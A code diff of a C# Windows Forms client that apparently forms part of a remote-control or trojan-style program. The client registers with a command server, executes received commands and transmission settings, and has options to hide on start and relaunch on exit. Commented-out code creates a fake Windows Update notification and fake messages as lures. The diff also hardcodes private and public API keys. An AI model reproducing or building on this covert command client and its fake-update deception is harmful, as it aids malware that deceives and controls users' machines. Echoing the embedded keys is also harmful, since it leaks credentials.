@@ -33,25 +33,43 @@ namespace Client
         public Form1(string[] args)
         {
             InitializeComponent();
+            AppendText("Initializing...");
             Handler.Instance.Initialize(new HandlerInitData()
             {
                 HostForm = this,
-                Url = new Uri("http://localhost:3226/api"),
+                Url = new Uri("http://localhost:64737/api"),
                 //Url = new Uri("http://restless-honey-seeker.azurewebsites.net:80/api"),
                 APIKEY_PRIVATE = "ca71ab6e833b109d781c722118d2bff373297dc1",
                 APIKEY_PUBLIC = "a12ee5029cbf44c55869ba6d629b683d8f0044ef",
                 CONNECTION_TIMEOUT = 10000,
                 CONNECTION_INTERVAL = 10000,
-                startNewProcessOnExit = false
+                startNewProcessOnExit = false,
+                HideOnStart = false
             });
             Handler.Instance.OnCommandEvent += Instance_OnCommandEvent;
+            Handler.Instance.OnAuthorizedEvent += Instance_OnAuthorizedEvent;
             LoadPlugins();
             //SetupFakeMsg();
             //CreateFakeWindowsUpdateNotifyIcon(1000,  "New updates are available", "Click to install them using Windows Update.");
         }
 
+        void Instance_OnAuthorizedEvent(object sender, AuthEventArgs e)
+        {
+            //if (e.IsAuthenticated)
+            {
+                AppendText("Authorized");
+            }
+        }
+
+        void AppendText(string text)
+        {
+            richTextBox1.AppendText(text + Environment.NewLine);
+        }
+
         void Instance_OnCommandEvent(object sender, ECommand e)
         {
+            var s = Handler.Instance.Transmitter.TSettings;
+            AppendText("Command: " + e + ", File: " + s.File + ", Parameters: " + s.Parameters);
             switch (e)
             {
                 case ECommand.SET_TRANSMISSION_INTERVAL:
@@ -327,6 +345,15 @@ namespace Client
         private void Form1_Load(object sender, EventArgs e)
         {
 
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            try
+            {
+                Handler.Instance.Transmitter.DeAuthorize();
+            }
+            catch { }
         }
     }
 }
